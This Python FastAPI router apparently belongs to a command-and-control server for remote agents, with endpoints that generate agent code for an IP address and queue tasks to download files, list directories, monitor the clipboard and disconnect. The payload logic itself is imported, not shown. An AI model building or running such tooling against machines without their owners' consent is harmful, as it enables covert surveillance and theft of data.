from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

import Logic.Commands.CommandsLogic as commandLogic
import Logic.Agents.AgentsLogic as agentLogic
import Logic.Request.RequestLogic as requestLogic
from Utils.Exceptions.NotFoundException import NotFoundException
from Utils.Exceptions.LogicException import LogicException

AgentCodesPath = 'AgentCodes'

router = APIRouter(
    prefix='/internal'
)


class GenerateAgentCodeInput(BaseModel):
    ip_address: str


class DownloadFileInput(BaseModel):
    ip_address: str
    file_path: str


class ListFilesInput(BaseModel):
    ip_address: str
    dir_path: str


class MonitorClipboardInput(BaseModel):
    ip_address: str
    duration: int


class DisconnectAgentInput(BaseModel):
    ip_address: str


@router.post("/generateAgentCode")
async def generate_agent_code(input: GenerateAgentCodeInput):
    try:
        agentLogic.add_agent(agentLogic.AddAgentInputType(ip_address=input.ip_address))
    except LogicException as e:
        print(str(e))

    code = requestLogic.generate_first_code_for_agent(input.ip_address)
    return {'code': code}


@router.post("/downloadFile")
async def downloadFile(input: DownloadFileInput):
    try:
        command_id = commandLogic.add_download_file_task(commandLogic.DownloadFileTaskInputType(
            ip_address=input.ip_address, file_path=input.file_path
        ))
    except NotFoundException as e:
        print(str(e))
        raise HTTPException(status_code=404, detail=str(e))

    return {'command_id': command_id}


@router.post("/listFiles")
async def list_files(input: ListFilesInput):
    try:
        command_id = commandLogic.add_list_files_task(commandLogic.ListFilesTaskInputType(
            ip_address=input.ip_address, dir_path=input.dir_path
        ))
    except NotFoundException as e:
        print(str(e))
        raise HTTPException(status_code=404, detail=str(e))

    return {'command_id': command_id}


@router.post("/monitorClipboard")
async def monitor_clipboard(input: MonitorClipboardInput):
    try:
        command_id = commandLogic.add_monitor_clipboard_task(commandLogic.MonitorClipboardTaskInputType(
            ip_address=input.ip_address, duration=input.duration
        ))
    except NotFoundException as e:
        print(str(e))
        raise HTTPException(status_code=404, detail=str(e))

    return {'command_id': command_id}


@router.post("/disconnectAgent")
async def disconnect_agent(input: DisconnectAgentInput):
    try:
        command_id = commandLogic.add_disconnect_agent_task(commandLogic.DisconnectAgentTaskInputType(
            ip_address=input.ip_address))
    except NotFoundException as e:
        print(str(e))
        raise HTTPException(status_code=404, detail=str(e))

    return {'command_id': command_id}


@router.get("/agents")
async def list_agents():
    agents = agentLogic.list_agents()

    return {'agents': agents}
